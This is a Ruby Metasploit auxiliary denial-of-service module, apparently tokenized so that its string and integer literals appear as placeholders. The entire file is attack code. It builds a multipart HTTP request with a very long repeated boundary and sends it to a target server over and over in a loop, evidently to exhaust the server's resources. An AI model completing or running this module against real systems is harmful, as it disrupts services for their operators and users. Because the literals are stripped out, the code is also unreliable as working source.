require <str> class Metasploit4 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient include Msf :: Auxiliary :: Dos def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptInt . new ( <str> , [ true , <str> , <int> ] ) ] , self . class ) end def run boundary = <str> * <int> opts = { <str> = > <str> , <str> = > normalize_uri ( target_uri . to_s ) , <str> = > <str> boundary <str> , <str> = > <str> boundary <str> , <str> = > { <str> = > <str> } } for x in <int> .. datastore [ <str> ] print_status ( <str> x <str> peer <str> ) begin c = connect r = c . request_cgi ( opts ) c . send_request ( r ) rescue :: Rex :: ConnectionError = > exception print_error ( <str> exception . message <str> ) return ensure disconnect ( c ) if c end end end end 
